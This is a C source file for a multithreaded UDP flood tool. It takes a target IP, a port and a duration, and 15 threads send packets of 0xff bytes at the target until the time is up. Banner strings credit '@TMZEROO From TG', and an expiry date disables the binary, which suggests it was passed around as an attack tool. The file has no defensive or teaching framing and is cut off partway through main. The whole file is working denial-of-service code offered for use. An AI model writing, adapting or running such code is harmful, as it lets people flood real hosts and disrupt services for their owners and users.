#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_USERS 15
#define PACKET_SIZE 1024
#define EXPIRY_DATE "2024-10-24"
#define BINARY_EXPIRY_MSG "Binary is Closed By @TMZEROO From TG\n"
#define ATTACK_START_MSG "Attack started by @TMZEROO From TG\n"
#define ATTACK_FINISH_MSG "Attack Finished By @TMZEROO On TG\n"

// Function to check if the binary has expired
int is_binary_expired() {
    time_t now = time(NULL);
    struct tm expiry = {0};
    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry);
    time_t expiry_time = mktime(&expiry);

    return now > expiry_time;
}

// Structure for attack parameters
typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} AttackParams;

// Function to send UDP traffic
void* send_udp_traffic(void* args) {
    AttackParams *params = (AttackParams*) args;
    int sock;
    struct sockaddr_in target_addr;
    char packet[PACKET_SIZE];
    memset(packet, 0xff, PACKET_SIZE);

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    target_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    time_t end_time = time(NULL) + params->duration;

    while (time(NULL) < end_time) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
        usleep(1000); // Control packet sending speed
    }

    close(sock);
    return NULL;
}

// Main function to handle the attack
void start_attack(const char* ip, int port, int duration) {
    printf(ATTACK_START_MSG);

    pthread_t threads[MAX_USERS];
    AttackParams params[MAX_USERS];

    for (int i = 0; i < MAX_USERS; i++) {
        strncpy(params[i].target_ip, ip, sizeof(params[i].target_ip));
        params[i].target_port = port;
        params[i].duration = duration;
        pthread_create(&threads[i], NULL, send_udp_traffic, &params[i]);
    }

    for (int i = 0; i < MAX_USERS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf(ATTACK_FINISH_MSG);
}

int main(int argc, char* argv[]) {
    if (is_binary_expired()) {
        printf(BINARY_EXPIRY_MSG);
        return 1;
    }

    if (argc != 4) {
        printf("Usage: %s <target_ip> <target_port> <duration_seconds>\n", argv[0]);
        return 1;
    }

    const char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (duration > 1000)
{
        printf("
